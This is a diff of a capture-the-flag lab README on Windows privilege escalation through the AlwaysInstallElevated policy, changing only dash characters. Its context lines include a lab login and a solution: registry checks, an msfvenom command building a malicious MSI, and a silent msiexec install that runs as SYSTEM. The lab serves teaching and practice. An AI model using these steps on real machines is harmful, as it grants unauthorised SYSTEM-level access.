@@ -1,4 +1,4 @@
-# Challenge 2 — AlwaysInstallElevated
+# Challenge 2  AlwaysInstallElevated
 
 **Difficulty:** Easy  
 **Category:** Windows Privilege Escalation  
@@ -8,7 +8,7 @@
 
 ## Story
 
-You're `ctfplayer` — a standard user with no admin rights.
+You're `ctfplayer`  a standard user with no admin rights.
 Something is wrong with this machine's Group Policy.
 Every `.msi` installer runs as SYSTEM, no matter who double-clicks it.
 
@@ -27,7 +27,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 
 4. Log in as `ctfplayer` / `Player123!`
 
-> **Important:** Take a VM snapshot before setup. Revert afterward — this policy is a real vulnerability.
+> **Important:** Take a VM snapshot before setup. Revert afterward  this policy is a real vulnerability.
 
 ---
 
@@ -76,9 +76,9 @@ CMD='cmd /c copy C:\CTF\challenge2\flag.txt C:\Users\Public\flag.txt && icacls C
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Confirm the vulnerability
+### Step 1  Confirm the vulnerability
 
 ```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -87,7 +87,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 Both return `0x1`.
 
-### Step 2 — Generate the malicious MSI (on your attack machine / Kali)
+### Step 2  Generate the malicious MSI (on your attack machine / Kali)
 
 ```bash
 msfvenom -p windows/x64/exec \
@@ -97,15 +97,15 @@ msfvenom -p windows/x64/exec \
 
 Transfer `evil.msi` to the Windows VM (shared folder, HTTP server, etc.).
 
-### Step 3 — Install the MSI as ctfplayer
+### Step 3  Install the MSI as ctfplayer
 
 ```powershell
 msiexec /quiet /qn /i C:\Users\ctfplayer\Desktop\evil.msi
 ```
 
-Windows runs the installer as SYSTEM — your command executes with full privileges.
+Windows runs the installer as SYSTEM  your command executes with full privileges.
 
-### Step 4 — Read the flag
+### Step 4  Read the flag
 
 ```powershell
 type C:\Users\Public\flag.txt
